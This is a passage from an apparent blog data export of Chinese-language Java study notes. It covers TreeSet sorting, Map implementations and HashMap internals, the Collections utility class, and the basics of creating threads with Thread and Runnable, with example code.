4.自然排序中，比较两个对象是否相同的标准为：compare()返回0，不再是equals()\n\n     */\n    @Test\n    public void test2(){\n//        TreeSet\n        TreeSet set = new TreeSet();\n//        set.add(123);\n//        set.add(456);\n//        set.add(5);\n//        set.add(56);\n//        set.add(-6);\n//        set.add(\"AAA\"); //不能添加不同类的对象\n\n          set.add(new Person(\"Tom\", 18));\n          set.add(new Person(\"Tom\", 21));  //两个相同的\n          set.add(new Person(\"Lisa\", 20));\n          set.add(new Person(\"Jack\", 17));\n          set.add(new Person(\"Jerry\", 25));\n\n          //自然排序\n          Iterator iterator = set.iterator();\n          while (iterator.hasNext()){\n              System.out.println(iterator.next());\n          }\n\n\n          // 定制排序：Comparator\n          Comparator com = new Comparator() {\n              //按照年龄从小到大排序\n              @Override\n              public int compare(Object o1, Object o2) {\n                  if (o1 instanceof Person && o2 instanceof Person){\n                      Person p1 = (Person)o1;\n                      Person p2 = (Person)o2;\n                      return Integer.compare(p1.getAge(), p2.getAge());\n\n                  }else{\n                      throw new RuntimeException(\"输入的数据类型不匹配\");\n                  }\n              }\n          };\n\n          TreeSet set2 = new TreeSet();\n          set2.add(new Person(\"Tom\", 18));\n          set2.add(new Person(\"Tom\", 21));  //两个相同的\n          set2.add(new Person(\"Lisa\", 20));\n          set2.add(new Person(\"Jack\", 17));\n          set2.add(new Person(\"Jerry\", 18));\n    }\n}\n\n```\n\n\n\n```java\n package cn.xpshuai.java1;\n\n\nimport java.util.Objects;\n\nclass Person implements Comparable{\n    private String name;\n    private int age;\n\n    public Person() {\n    }\n\n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public int getAge() {\n        return age;\n    }\n\n    public void setAge(int age) {\n        this.age = age;\n    }\n\n    public void walk(){\n        System.out.println(\"走路\");\n    }\n\n    public void eat(){\n        System.out.println(\"吃饭\");\n    }\n\n\n    @Override\n    public boolean equals(Object o) {\n        System.out.println(\"调用了equals方法\");\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Person person = (Person) o;\n        return age == person.age &&\n                Objects.equals(name, person.name);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(name, age);\n    }\n\n    //重写、按照姓名从小到大排序\n    @Override\n    public int compareTo(Object o) {\n        if(o instanceof Person){\n            Person person = (Person)o;\n//            return this.name.compareTo(person.name);\n\n            int compare = this.name.compareTo(person.name);\n            if (compare != 0){\n                return compare;\n            }else { //二级排序, 若姓名相同则再比较age\n                return Integer.compare(this.age, person.age);\n            }\n        }else{\n            throw new RuntimeException(\"输入的类型不匹配\");\n        }\n    }\n\n    @Override\n    public String toString() {\n        return \"Person{\" +\n                \"name='\" + name + '\\'' +\n                \", age=\" + age +\n                '}';\n    }\n}\n```\n\n\n\n\n\n\n\n![set实现类-HashSet](http://image.xpshuai.cn/set%E5%AE%9E%E7%8E%B0%E7%B1%BB-HashSet.png)\n\n\n\n![编译器中hashCode的重写](http://image.xpshuai.cn/%E7%BC%96%E8%AF%91%E5%99%A8%E4%B8%ADhashCode%E7%9A%84%E9%87%8D%E5%86%99.png)\n\n![TreeSet红黑树](http://image.xpshuai.cn/TreeSet%E7%BA%A2%E9%BB%91%E6%A0%91.png)\n\n\n\n\n\n**练习1：**\n\nHashSet可以用来去重\n\n![HashSet去重练习](http://image.xpshuai.cn/HashSet%E5%8E%BB%E9%87%8D%E7%BB%83%E4%B9%A0.png)\n\n\n\n\n\nHashSet先HashCode再equals()\n\n\n\n\n\n### <font color=red>Map接口(重点)</font>\n\n> 双列数据，保存具有映射关系的\"key-value\"对的集合\n>\n> 类似高中函数: y = f(x)，不同key可以指向相同的value\n\n\n\n**Map接口继承树：**\n\n![map接口继承树](http://image.xpshuai.cn/map%E6%8E%A5%E5%8F%A3%E7%BB%A7%E6%89%BF%E6%A0%91.png)\n\n\n\n\n\n**Map结构的理解:** \n\n![Map结构的理解](http://image.xpshuai.cn/Map%E7%BB%93%E6%9E%84%E7%9A%84%E7%90%86%E8%A7%A3.png)\n\n\n\n**常见面试题：**\n\n```java\n谈谈你对HashMap中put/get方法的认识?如果了解再谈谈HashMap的扩容机制?默认大小是多少?什么是负载因子(或填充比)?什么是春吐临界值(或阈值、threshold)?\n```\n\n\n\n**HashMap源码中重要常量：**\n\n![HashMap源码中重要常量](http://image.xpshuai.cn/HashMap%E6%BA%90%E7%A0%81%E4%B8%AD%E9%87%8D%E8%A6%81%E5%B8%B8%E9%87%8F.png)\n\n![HashMap内部类Node,Entry](http://image.xpshuai.cn/HashMap%E5%86%85%E9%83%A8%E7%B1%BBNode%2CEntry.png)\n\n\n\n**Map中常用的方法:** \n\n![Map接口中常用的方法](http://image.xpshuai.cn/Map%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95.png)\n\n\n\n```\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.util.*;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-27 16:22\n * @功能：\n *\n *\n *一、Map的结构体系\n * | ----- Map接口: 双列数据，保存具有映射关系的\"key-value\"对的集合(类似高中函数: y = f(x)，不同key可以指向相同的value)\n *      |---- HashMap(面试问的多, 平时也常用): 作为Map的主要实现类; 线程不安全的，效率高；存储null的key和value\n *          |---- LinkedHashMap:保证在遍历map元素时，可以按照添加的循序实现遍历\n *                              原因：在原有的HashMap的基础上，添加了一堆指针，指向前一个和后一个元素\n *                              对于频繁的遍历操作，此类执行效率高于HashMap\n *      |---- TreeMap: 保证按照添加的key-value进行排序，实现排序遍历(此时考虑key的自然排序和定制排序)\n *      |---- Hashtable: 作为古老的实现类；线程安全的，效率低；不能存储null的key和value\n *          |---- Properties: 常用来处理配置文件。key和value都是String类型\n *\n *\n *  HashMap的底层：数组+链表(jdk7及之前)\n *                 数组+链表+红黑树(jdk8)\n *\n *\n *二、Map结构的理解\n * Map中的key: 无序的、不可重复的，使用Set存储所有的key  ---> key所在的类要重写equaLs( )和hashcode() （以HashMap为例）\n * Map中的value：无序的、可重复的，使用Collection存储所有的value  -->vaLue所在的类要重写equals()\n * 一个键值对：key-value构成了一个Entry对象\n * Map中的Entry: 无序的、不可重复的，使用Set存储所有的entry\n *\n *\n *三、HashMap的底层实现原理\n * jdk7为例：\n * HashMap map = new HashMap();\n * 在实例化以后，底层创建了长度为16的以为数组Entry[] table\n * ... 可能已经执行了多次put ...\n * map.push(key1, value1);\n * 首先，计算key1所在类的hashCode()，计算key1的哈希值，此哈希值经过某种算法计算以后，得到在Entry数组中的存放位置\n * 如果此位置上的数据为空，此时的key1-value1添加成功  ---> 情况1\n * 如果此位置上的数据不为空(此位置存在一个或多个数据(以链表形式存在)), 比较key1和已经存在的一个或多个数据的hash值：\n *      如果key1的hash值与已存在的数据的hash值都不相同，此时key1-value1添加成功       ---> 情况1\n *      如果key1的hash值与已存在的数据的某一个数据(key2-value2)的hash值都不相同，继续比较: 调用key1所在类的equals()方法，比较:\n *          如果equals()返回false:此时key1-value1添加成功     ---> 情况3\n *          如果equals()返回true:使用value1替换相同key的value2值，\n *          key1-value1添加成功\n * 补充：关于情况2和情况3: 此时key1-value1和原来的数据以链表的方式存储\n *\n * 在不断的添加过程中，会涉及到扩容问题, 当超出临界值(且要存放的位置非空)时，扩容。默认的扩容方式为扩容到原来容量的2倍，并将原有数据复制过来\n *\n * jdk8 相较于jdk7，在底层实现方面的不同；\n     * 1.new HashMap()： 底层没有创建一个长度为16的数组\n     * 2.jdk8底层的数据是 Node[], 而非Entry[]\n     * 3.首次调用put()方法时，底层创建长度为16的数组\n     * 4.jdk7底层结构只有：数组+链表, jdk8中底层结构:数组+链表+红黑树\n     *      当数组的某一个索引位置上的元素以链表形式存在的数据个数>8 且当前数组的长度>64时，\n     *       此时此索引位置上所有数据改为红黑树存储\n *\n *\n *HashMap源码分析:\n * jdk7\n * jdk8\n *\n *\n * DEFAULT_INITIAL_CAPACITY : HashMap的默认容量，16\n * DEFAULT_LOAD_FACTOR: HashMap的默认加载因子:0.75\n * threshold:扩容的临界值，=容量*填充因子:16* 0.75 =>12\n * TREEIFY_THRESHOLD: Bucket中链表长度大于该默认值，转化为红黑树:8\n * MIN_TREEIFY_CAPACITY:桶中的Node被树化时最小的hash表容量:64\n *\n *\n *\n * 面试题:\n * 1.HashMap的底层实现原理(重点)\n * 2.HashMap和Hashtable区别\n * 3.CurrentHashMap与Hashtable区别\n *\n *\n *\n * 四、LinkedHashMap的底层实现:\n *    static class Entry<K,V> extends HashMap.Node<K,V> {\n *         Entry<K,V> before, after;  //能够记录添加的元素的先后顺序\n *         Entry(int hash, K key, V value, Node<K,V> next) {\n *             super(hash, key, value, next);\n *         }\n *     }\n *\n *\n *\n * 五、Map中常用的方法\n *\n *\n * 六、TreeMap\n * //向TreeMap中添加key-value，要求key必须是由同一个类创建的对象\n * //因为要按照key进行排序:自然排序、定制排序\n *\n *\n *\n */\npublic class MapTest {\n    @Test\n    public void test1(){\n    Map map = new HashMap();\n//    map = new HashMap();\n        map.put(null, 123);\n\n\n\n    }\n\n    @Test\n    public void test2(){\n        HashMap map = new HashMap();\n//    map = new HashMap();\n        map.put(null, 123);\n\n    }\n    @Test\n    public void test3(){\n        HashMap map = new HashMap();\n        map = new LinkedHashMap(); // 记录了添加的顺序\n        map.put(123, \"AA\");\n        map.put(124, \"BB\");\n        map.put(567, \"CC\");\n        System.out.println(map);\n\n//        LinkedHashMap\n    }\n\n    /*\n    Map中常用的方法\n     */\n    @Test\n    public void tes4(){\n        // Object put(Object key, Object value):将制定键值对添加(修改)到当前map对象中\n\n        // void putAll(Map m): 将m中所有键值对存放到当前map中\n        // Object remove(Object key): 移除指定key的键值对，并返回value\n        // void clear(): 清空当前map中的所有数据\n\n        HashMap map = new HashMap();\n        //put 添加\n        map.put(123, \"AA\");\n        map.put(\"BB\", \"222\");\n        map.put(567, \"CC\");\n        map.put(56, \"CCC\");\n        // put修改\n        map.put(56, \"566666\");\n\n        //putAll()\n        HashMap map2 = new HashMap();\n        map2.put(1, \"AA\");\n        map2.put(2, \"AB\");\n        map.putAll(map2);\n\n        //remove\n        Object val = map.remove(\"BB\");\n        System.out.println(val);\n        System.out.println(map);\n\n        //clear\n//        map.clear();\n        System.out.println(map.size());\n\n        //元素查询的操作:\n        //object get(0bject key):获取指定key对应的vaLue\n        System.out.println(map.get(45));\n        //boolean containsKey (object key):是否包含指定的key\n        System.out.println(map.containsKey(45));\n        //boolean containsValue(object value):是否包含指定的value\n        // int size():返回map 中key-value对的个数\n        //boolean isEmpty():判断当前map是否为空\n        System.out.println(map.isEmpty());\n        //boolean equals(object obj):判断当前map和参数对象obj是否相等\n        System.out.println(map.equals(map2));\n\n\n//        元视图操作的方法(遍历):\n//        set keySet():返回所有key构成的Set集合\n        // 遍历所有key\n        Set set = map.keySet();\n        Iterator iterator = set.iterator(); //变成set了，就可以用迭代器了\n        while (iterator.hasNext()){\n            System.out.println(iterator.next());\n        }\n\n//        collection values():返回所有value构成的collection集合set entryset():返回所有key-value对构成的Set集合\n        Collection values = map.values();\n        for(Object obj: values){ // 变成collections了，就可以用foreach了\n            System.out.println(obj);\n        }\n\n        //遍历所有的key-value:\n        // 方式1：entrySet()\n        Set entrySet = map.entrySet();\n        Iterator iterator1 = entrySet.iterator();\n        while (iterator1.hasNext()){\n            Object obj = iterator1.next();\n            // entrySet集合中的元素都是entry\n            Map.Entry entry = (Map.Entry)obj;\n            System.out.println(entry.getKey() + \" --- \" + entry.getValue());\n        }\n        //方式2：\n        Set set2 = map.keySet();\n        Iterator iterator2 = set2.iterator(); //变成set了，就可以用迭代器了\n        while (iterator2.hasNext()){\n            Object key = iterator2.next();\n            System.out.println(key+ \"<--->\" + map.get(key));\n        }\n\n\n\n    }\n\n\n    @Test\n    public void test5(){\n        //向TreeMap中添加key-value，要求key必须是由同一个类创建的对象\n        // 因为要按照key进行排序:自然排序、定制排序\n        // //TreeMap自然排序\n        TreeMap map = new TreeMap();\n        Person p1 = new Person(\"TOm\", 18);\n        Person p2 = new Person(\"Jerry\", 18);\n        Person p3 = new Person(\"Jack\", 20);\n        Person p4 = new Person(\"Rose\", 21);\n        Person p5 = new Person(\"Lura\", 22);\n        map.put(p1, 98);\n        map.put(p2, 99);\n        map.put(p3, 100);\n        map.put(p4, 88);\n        map.put(p5, 92);\n        Set entrySet = map.entrySet();\n        Iterator iterator1 = entrySet.iterator();\n        while (iterator1.hasNext()){\n            Object obj = iterator1.next();\n            // entrySet集合中的元素都是entry\n            Map.Entry entry = (Map.Entry)obj;\n            System.out.println(entry.getKey() + \" --- \" + entry.getValue());\n        }\n\n\n        // //TreeMap定制排序\n        TreeMap map2 = new TreeMap(new Comparator() {\n            @Override\n            public int compare(Object o1, Object o2) {\n                // 比较年龄\n                if (o1 instanceof Person && o2 instanceof Person){\n                    Person p1 = (Person)o1;\n                    Person p2 = (Person)o2;\n                    return Integer.compare(p1.getAge(), p2.getAge());\n                }\n                throw new RuntimeException(\"输入的类型不匹配\");\n            }\n        });\n        Person p11 = new Person(\"TOm\", 18);\n        Person p21 = new Person(\"Jerry\", 18);\n        Person p31 = new Person(\"Jack\", 20);\n        Person p41 = new Person(\"Rose\", 21);\n        Person p51 = new Person(\"Lura\", 22);\n        map2.put(p11, 98);\n        map2.put(p21, 99);\n        map2.put(p31, 100);\n        map2.put(p41, 88);\n        map2.put(p51, 92);\n        Set entrySet2 = map2.entrySet();\n        Iterator iterator2 = entrySet2.iterator();\n        while (iterator2.hasNext()){\n            Object obj = iterator2.next();\n            // entrySet集合中的元素都是entry\n            Map.Entry entry2 = (Map.Entry)obj;\n            System.out.println(entry2.getKey() + \" --- \" + entry2.getValue());\n        }\n\n\n\n    }\n}\n\n```\n\n\n\n**Map实现类之四: Hashtable**\n\n- Hashtable是个古老的 Map 实现类，JDK1.0就提供了。不同于HashMap,Hashtable是线程安全的。\n- Hashtable实现原理和lHashMap相同，功能相同。底层都使用哈希表结构，查询速度快，很多情况下可以互用。\n- 与HashMap不同，Hashtable不允许使用null作为 key和l value\n- 与HashMap一样，Hashtable 也不能保证其中Key-Value 对的顺序\n- Hashtable判断两个key相等、两个value相等的标准，与HashMap一致。\n\n\n\n**Map实现类之五:Properties**\n\n- Properties类是Hashtable的子类，该对象用于处理属性文件\n- 由于属性文件里的key、value 都是字符串类型，所以 Properties里的key和l value都是字符串类型\n- 存取数据时，建议使用`setProperty(String key,String value)`方法和`getProperty(String key)`方法\n  \n\n```java\npackage cn.xpshuai.java1;\n\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.util.Properties;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 8:54\n * @功能：\n *\n *  |---- Properties: 常用来处理配置文件。key和value都是String类型\n */\npublic class PropertiesTest {\n    public static void main(String[] args) throws Exception {\n    FileInputStream fis = null;\n    try{\n        Properties properties = new Properties();\n        //默认在当前工程下:xxx.properties\n        fis = new FileInputStream(\"XXX.properties\");  //文件流\n        properties.load(fis);  //加载流对应的文件\n        String name = properties.getProperty(\"name\"); //获取属性key\n        String passwd = properties.getProperty(\"passwd\");\n        System.out.println(name + passwd);\n        fis.close();\n    }catch (IOException e){\n        e.printStackTrace();\n    }finally {\n        if(fis != null){\n            fis.close();\n        }\n    }\n\n\n    }\n}\n\n```\n\n\n\n\n\n\n\n### Collections工具类\n\n- Collections是一个操作**Set、list和lMap等集合**的工具类\n- Collections中提供了一系列**静态的方法**对集合元素进行排序、查询和修改等操作，还提供了对集合对象设置不可变、对集合对象实现同步控制等方法\n- 排序操作:(均为static方法)\n\n```java\nreverse(List):反转List中元素的顺序\nshuffle(List):对List集合元素进行随机排序\nsort(List):根据元素的自然顺序对指定List集合元素按升序排序\nsort(List，Comparator):根据指定的Comparator产生的顺序对List集合元素进行排序wap(List，int，int):将指定list集合中的i处元素和j处元素进行交换\n```\n\n\n\n**Collections常用方法**\n查找、替换\n\n```java\nObject max(Collection):根据元素的自然顺序，返回给定集合中的最大元素Object max(Collection，Comparator):根据Comparator指定的顺序，返回给定集合中的最大元素\noobject min(Collection)\noObject min(Collection，Comparator)\nint frequency(Collection，Object):返回指定集合中指定元素的出现次数\nvoid copy(List dest,List src):将src中的内容复制到dest中\nboolean replaceAll(List list，Object oldVal，Object newVal):使用新值替换List对象的所有旧值\n```\n\n![Collections常用方法-同步控制](http://image.xpshuai.cn/Collections%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95-%E5%90%8C%E6%AD%A5%E6%8E%A7%E5%88%B6.png)\n\n\n\n```java\npackage cn.xpshuai.java1;\n\nimport org.junit.Test;\n\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\n\n/**\n * @author: 剑胆琴心\n * @create: 2021-01-28 9:07\n * @功能：Collections:操作Collection、Map的工具类\n *\n *\n * 面试题:Collection 和Collections区别？\n *\n *\n *\n * 常用方法：\n * reverse(List):反转List中元素的顺序\n * shuffle(list):对List集合元素进行随机排序\n * sort(List):根据元素的自然顺序对指定List集合元素按升序排序\n * sort(List，Comparator):根据指定的Comparator产生的顺序对List集合元素进行排序\n * swap(List， int，int):将指定list集合中的i处元素和j处元素进行交换\n * object max(Collection):根据元素的自然顺序，返回给定集合中的最大元素\n * object max(collection，Comparator):根据Comparator指定的顺序，返回给定集合中的最\n * object min(collection)\n * object min(colLection，Comparator)\n * int frequency(collection，object):返回指定集合中指定元素的出现次数\n * void copy(List dest,List src):将src中的内容复制到dest中\n * boolean replaceAlL(List list，object oldval，object newVal):使用新值替换List对\n *\n *\n *\n */\npublic class CollectionsTest {\n    @Test\n    public void test(){\n        List list = new ArrayList();\n        list.add(132);\n        list.add(55);\n        list.add(666);\n        list.add(666);\n        list.add(-8);\n        list.add(100);\n        list.add(99);\n\n        Collections.reverse(list);\n        System.out.println(list); // list也改变了顺序哦\n\n        Collections.shuffle(list);\n        System.out.println(list);\n\n        Collections.sort(list);\n        Collections.swap(list, 1,2); //交换两个索引的位置\n        System.out.println(list);\n\n        Collections.frequency(list,666); //出现次数\n\n\n        // copy(List dst, List src): 将src的内容复制到dst中\n        //易错点: dst的长度不能比src小\n        //错误写法\n//        List dst = new ArrayList();\n//        Collections.copy(dst, list);\n//        System.out.println(dst);\n        //比较标准的写法\n        List dst = Arrays.asList(new Object[list.size()]); // n个null\n        Collections.copy(dst, list);\n        System.out.println(dst);\n\n\n        //synchronizedXXX()方法\n        //Collections类中提供了多个synchronizedXxx()方法，该方法可使将指定集合包装成线程同步的集合，从而可以解决多线程并发访问集合时的线程安全问题\n        ///返回的List1即为线程安全的List\n        List list1 = Collections.synchronizedList(list);\n\n\n    }\n}\n\n```\n\n\n\n","tags":["List"],"categories":["Java学习"]},{"title":"Java学习之多线程","url":"%2Fposts%2F27205%2F","content":"\n\n\n### 基本概念\n\n![image-20210116145142703](http://image.xpshuai.cn/%E5%A4%9A%E7%BA%BF%E7%A8%8B_%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.png)\n\n\n\n**JVM内存结构：**\n\n![image-20210116145803616](http://image.xpshuai.cn/%E5%A4%9A%E7%BA%BF%E7%A8%8B_JVM.png)\n\n\n\n**单核CPU和多核CPU的理解：**\n\n- 单核：其实是一种假的多线程。因为在一个时间单元内，也只能执行一个线程的任务。\n- 多核：如果是多核的话，才能更好的发挥多线程的效率。（现在的服务器都是多核的)\n- 一个Java应用程序java.exe，其实至少有三个线程：main()主线程，gc()垃圾回收线程，异常处理线程。当然如果发生异常，会影响主线程。\n\n\n\n- **并行：**多个CPU同时执行多个任务。比如:多个人同时做不同的事。\n\n- **并发：**一个CPU(采用时间片)同时执行多个任务。比如:秒杀、多个人做同一件事\n\n\n\n**使用多线程的优点：**\n\n1. 提高应用程序的响应。对图形化界面更有意义，可增强用户体验。\n\n2. 提高计算机系统CPU的利用率\n\n3. 改善程序结构。将既长又复杂的进程分为多个线程，独立运行，利于理解和修改\n\n   \n\n**何时需要多线程：**\n\n- 程序需要同时执行两个或多个任务。\n- 程序需要实现一些需要等待的任务时，如用户输入、文件读写操作、网络操作、搜索等。\n- 需要一些后台运行的程序时。\n\n\n\n\n\n\n\n### 线程的创建和使用\n\n> 共四种：1.继承与Thread类；2.实现Runnable接口； 3.实现Callable接口； 4.线程池\n\n\n\nJava语言的JVM允许程序运行多个线程，它通过`java.lang.Thread`类来体现。\n\n**Thread类的特性：**\n\n每个线程都是通过某个特定Thread对象的`run()`方法来完成操作的，经常把`run()`方法的主体称为线程体\n通过该Thread对象的`start()`方法来启动这个线程，而非直接调用run()\n\n\n\n#### <font color=red>方法1：继承于Thread类</font>\n\n**步骤：**\n\n1. 创建一个继承与Thraed的子类\n2. 重写Thread类的run()方法-->将此线程要执行的操作写在该方法内\n3. 创建Thread类的子对象\n4. 通过此对象调用start()方法\n\n\n\n例子：多线程遍历100以内所有偶数\n\n```\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-16 14:21\n *\n\n程序：指一段静态的代码\n进程：正在运行的一个程序，是资源分配的单位，系统会为每个进程分配Wie不同的内存区域是动态的。\n线程：调度和执行的单位，每个线程拥有独立的运行栈和程序计数器，线程切换的开销小\n      进程可以细化为线程，线程是一个陈旭内部的一条执行路径\n      多个线程操作共享的系统资源(进程中的方法区和堆)可能带来安全隐患。\n\n\n\n 【创建多线程】\n【方式1】：继承Thread类\n 1.创建一个继承与Thraed的子类\n 2.重写Thread类的run()方法-->将此线程要执行的操作写在该方法内\n 3.创建Thread类的子对象\n 4.通过此对象调用start()方法\n 例子：遍历100以内所有偶数\n\n\n *\n */\npublic class MultiThreadsTest {\n    public static void main(String[] args) {\n        //3.创建Thread类的子对象\n        MyThread1 myThread1 = new MyThread1(); // alt + enter 自动创建对象\n        //4.通过此对象调用start()方法：(1)启动当前线程 (2)调用当前线程的run()\n        myThread1.start();\n//        问题1：不能通过直接调用run()的方式启动线程\n//        myThread1.run();\n//        问题2：再启动一个线程，遍历100以内偶数，不可以还让已经start()的线程去执行\n//               但是可以new一个新的线程的对象，再去启动\n        MyThread1 myThread2 = new MyThread1();\n        myThread2.start();\n\n        //如下操作仍然是在main线程中执行的\n        for (int i = 0; i < 100; i++) {\n            System.out.println(\"hello\");  //hello在哪输出是不确定的\n            System.out.println(Thread.currentThread().getName() + \":\" + i);  //查看线程名\n\n        }\n\n    }\n}\n\n\n//1.创建一个继承与Thraed的子类\nclass MyThread1 extends Thread{\n\n    //2.重写Thread类的run()方法\n    @Override\n    public void run() {\n        //方法体里面，要写要做的事\n        for (int i = 0; i < 100; i++) {\n            if(i % 2 == 0){\n                System.out.println(Thread.currentThread().getName() + \":\" + i);\n            }\n        }\n    }\n}\n\n```\n\n\n\n例子：创建两个分线程，其中一个遍历100以内偶数，另外一个遍历100以内基数(两个线程做的事情不一样)\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-16 16:11\n * 练习：创建两个分线程，其中一个遍历100以内偶数，另外一个遍历100以内基数(两个线程做的事情不一样)\n */\npublic class ThreadCase {\n    public static void main(String[] args) {\n        //可以写两个，分别调用\n        ForDouble m1 = new ForDouble();\n        ForSingle m2 = new ForSingle();\n\n        m1.start();\n        m2.start();\n\n\n        // 或者：如果只用一次的话，可以创建Thread类的匿名子类的方法\n        new Thread(){\n            @Override\n            public void run() {\n                for (int i = 0; i < 100; i++) {\n                    if(i % 2 == 0){\n                        System.out.println(Thread.currentThread().getName() + \"-- 偶数 --\" + i);\n                    }\n                }\n            }\n        }.start();\n        new Thread(){\n            @Override\n            public void run() {\n                for (int i = 0; i < 100; i++) {\n                    if(i % 2 != 0){\n                        System.out.println(Thread.currentThread().getName() + \"-- 偶数 --\" + i);\n                    }\n                }\n            }\n        }.start();\n        \n\n\n\n    }\n}\n\n\nclass ForDouble extends Thread{\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            if(i % 2 == 0){\n                System.out.println(Thread.currentThread().getName() + \"-- 偶数 --\" + i);\n            }\n        }\n    }\n}\n\nclass ForSingle extends Thread{\n\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            if(i % 2 != 0){\n                System.out.println(Thread.currentThread().getName() + \"-- 奇数 --\" + i);\n            }\n        }\n    }\n}\n\n```\n\n\n\n不完善的例子2：继承Thread方式，实现多线程三个窗口售票，总票数为100张例子（待实现线程安全问题）\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: xps\n * @create 2021-01-16 17:30\n * @功能：继承Thread方式，实现多线程三个窗口售票，总票数为100张例子\n */\npublic class ThreadCase2 {\n    public static void main(String[] args) {\n        Windows w1 = new Windows();\n        Windows w2 = new Windows();\n        Windows w3 = new Windows();\n\n        w1.setName(\"窗口1\");\n        w2.setName(\"窗口2\");\n        w3.setName(\"窗口3\");\n\n        w1.start();\n        w2.start();\n        w3.start();\n    }\n\n}\n\n\nclass Windows extends Thread{\n//    private int tickets = 100; //这样只是实例的变量，会卖300张\n    private static int tickets = 100; //加了static也不对，需要解决线程安全问题\n    @Override\n    public void run() {\n        while (true){\n            if (tickets > 0){\n                System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets);\n                tickets--;\n            }else {\n                break;\n            }\n        }\n    }\n}\n\n```\n\n\n\n\n\n\n\n#### <font color=red>方法2：实现Runnable接口的方式</font>\n\n**步骤：**\n\n1. 创建一个实现了Runnable接口的类\n\n2. 实现Runnable中的抽象方法: run()\n\n3. 创建实现类的对象\n\n4. 将此对象作为参数传递到Thread类的构造器中，创建Thread的对象\n\n5. 通过Thread的对象调用start()\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-16 17:48\n * @功能：\n *\n *\n * 【创建多线程的方式2】：实现Runnable接口的方式\n *  1.创建一个实现了Runnable接口的类\n *  2.实现Runnable中的抽象方法: run()\n *  3.创建实现类的对象\n *  4.将此对象作为参数传递到Thread类的构造器中，创建Thread的对象\n *  5.通过Thread的对象调用start()\n *\n */\npublic class MultiThreadTest2 {\n    public static void main(String[] args) {\n\n//        3.创建实现类的对象\n        MyThread11 m11 = new MyThread11();\n//        4.将此对象作为参数传递到Thread类的构造器中，创建Thread的对象\n        Thread t1 = new Thread(m11);//类似于多态的思想\n        t1.setName(\"线程1\");\n\n//        5.通过Thread的对象调用start():(1)启动线程 (2)调用当前线程的run()-->调用了Runnable类型中的target的run\n        t1.start();\n\n        //再启动一个线程,直接new个Thread，共用同一个Runnable的实例\n        Thread t2 = new Thread(m11);\n        t2.setName(\"线程2\");\n        t2.start();\n\n    }\n}\n\n//1.创建一个实现了Runnable接口的类\nclass MyThread11 implements Runnable{\n//    2.实现Runnable中的抽象方法: run()\n    @Override\n    public void run() {\n        for (int i = 0; i < 100; i++) {\n            if(i % 2 == 0){\n                System.out.println(Thread.currentThread().getName() + \":\" + i);\n            }\n        }\n    }\n}\n```\n\n\n\n不完善的例子：用实现Runnable接口的方式，实现多线程三个窗口售票，总票数为100张例子（待实现线程安全问题）\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: xps\n * @create 2021-01-16 17:57\n * @功能：用实现Runnable接口的方式，实现现多线程三个窗口售票，总票数为100张例子\n * 待解决，仍然存在线程安全问题\n */\npublic class ThreadCase3 {\n    public static void main(String[] args) {\n        Windows2 w = new Windows2();\n\n        Thread t1 = new Thread(w);\n        Thread t2 = new Thread(w);\n        Thread t3 = new Thread(w);\n\n        t1.setName(\"窗口1\");\n        t2.setName(\"窗口2\");\n        t3.setName(\"窗口3\");\n\n        t1.start();\n        t2.start();\n        t3.start();\n    }\n\n}\n\n\n\nclass Windows2 implements Runnable{\n    private int tickets = 100; //不用加static了，但还会有线程安全问题\n    @Override\n    public void run() {\n        while (true){\n            if (tickets > 0){\n                System.out.println(Thread.currentThread().getName() + \":卖票，票号为：\" + tickets);\n                tickets--;\n            }else {\n                break;\n            }\n        }\n    }\n}\n```\n\n\n\n#### 两种创建方式比较\n\n```java\n开发中，第二种实现Runnable接口的方式比较好\n     如果用第一种方式，若该类已经存在一个父类，而Java又没有多继承,...\n     第二种方式，不仅没有类的单继承性的局限性，而且多个线程天然的就适合并可以共享数据\n联系：Thread类本身也实现了Runnable接口，两种方式都需要重写run()，将程序逻辑写在run()中\n```\n\n\n\n\n\n#### 线程中常用的方法\n\n\n\n![](http://image.xpshuai.cn/java%E7%BA%BF%E7%A8%8B%E4%B8%AD%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95.jpg)\n\n```java\npackage cn.xpshuai.java1;\n\n/**\n * @author: 剑胆琴心\n * @create 2021-01-16 16:47\n * @功能：测试Thread中的常用方法\n *\n *\n * 1.start() :启动当前线程；调用当前线程的run()方法\n * 2.run():通常需要重写Thread类的此方法，将创建的线程要自行的操作声明在此方法中\n * 3.currentThread()：静态方法，返回指定当前代码的线程\n * 4.getName():获取当前线程的名字\n * 5.setName():设置当前线程的名字\n * 6.yield():线程让步，暂停。释放当前CPU的执行\n * 7.join():在线程A中调用线程B的join()，此时线程A就进入阻塞，直到线程B完全执行完之后，线程A才结束阻塞状态\n * 8.sleep(long millitime): 让当前线程睡眠指定毫秒数(期间当前线程是阻塞状态)， 还是个静态方法\n * 9.stop():强制结束当前线程（不推荐使用）\n * 10.isAlive():判断当前线程知否存活\n *\n *\n *\n * 【线程的优先级】\n * MAX_PRIORITY:10\n * MIN_PRIORITY:1\n * NORM_PRIORITY:5\n *\n * 涉及的方法：\n * getPriority()：返回线程优先级\n * setPriority(int newPriority):改变线程的优先级\n *\n * 说明：\n * 线程创建时候继承父线程的优先级\n 